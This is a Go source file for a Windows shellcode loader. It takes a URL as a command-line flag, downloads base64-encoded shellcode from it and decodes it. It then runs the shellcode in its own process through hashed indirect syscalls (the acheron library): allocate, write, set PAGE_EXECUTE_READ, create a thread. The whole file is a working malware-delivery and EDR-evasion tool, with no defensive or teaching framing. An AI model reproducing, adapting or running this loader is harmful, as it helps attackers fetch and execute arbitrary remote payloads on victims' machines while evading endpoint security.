package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

// Remote shellcode load
func downloadShellcode(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal("Error reaching host:", err)
	}
	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading shellcode:", err)
	}

	return data
}

// Base64 decode
func decodeB64(data []byte) []byte {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		log.Fatal(err)
	}
	return decoded
}


func executeShellcode(shellcode []byte) {
	
	ach, err := acheron.New()
	if err != nil {
		log.Fatal("Acheron init failed:", err)
	}
// current process
	hSelf := uintptr(0xffffffffffffffff) 

	// Allocate RW memory
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))
	status, err := ach.Syscall(
		ach.HashString("NtAllocateVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil || status != 0 {
		log.Fatalf("NtAllocateVirtualMemory failed: 0x%x, %v", status, err)
	}
	fmt.Printf("[+] Allocated RW memory at 0x%x\n", baseAddr)

	// Copy shellcode using NtWriteVirtualMemory
	var written uintptr
	status, err = ach.Syscall(
		ach.HashString("NtWriteVirtualMemory"),
		hSelf,
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if err != nil || status != 0 {
		log.Fatalf("NtWriteVirtualMemory failed: 0x%x, %v", status, err)
	}
	fmt.Printf("[+] Wrote shellcode, %d bytes\n", written)

	// Changing memory protection to RX
	oldProtect := uintptr(0)
	status, err = ach.Syscall(
		ach.HashString("NtProtectVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil || status != 0 {
		log.Fatalf("NtProtectVirtualMemory failed: 0x%x, %v", status, err)
	}
	fmt.Println("[+] Memory protection set to PAGE_EXECUTE_READ")

	// Create thread
	var threadHandle uintptr
	status, err = ach.Syscall(
		ach.HashString("NtCreateThreadEx"),
		uintptr(unsafe.Pointer(&threadHandle)),
		windows.GENERIC_EXECUTE,
		0,
		hSelf,
		baseAddr,
		0,
		0, 0, 0, 0, 0,
	)
	if err != nil || status != 0 {
		log.Fatalf("NtCreateThreadEx failed: 0x%x, %v", status, err)
	}
	fmt.Println("[+] Shellcode executed in new thread")

	// Waiting for thread to finish
	status, err = ach.Syscall(
		ach.HashString("NtWaitForSingleObject"),
		threadHandle,
		windows.INFINITE,
	)
	if err != nil || status != 0 {
		log.Fatalf("NtWaitForSingleObject failed: 0x%x, %v", status, err)
	}

	fmt.Println("[+] Done")
}

func main() {
	name, err := os.Executable()
	if err != nil{
		name = "./file.exe"
	}

	usage := fmt.Sprintf("URL with the shellcode file encoded in base64\n\n%s -url http://<base64_encoded_file>", name)
	remotesh := flag.String("url", "", usage)
	flag.Parse()

	if *remotesh == "" {
		fmt.Println("Add the URL with the shellcode file encoded in base64!")
		os.Exit(1)
	}

	rawData := downloadShellcode(*remotesh)
	decoded := decodeB64(rawData)

	executeShellcode(decoded)
}

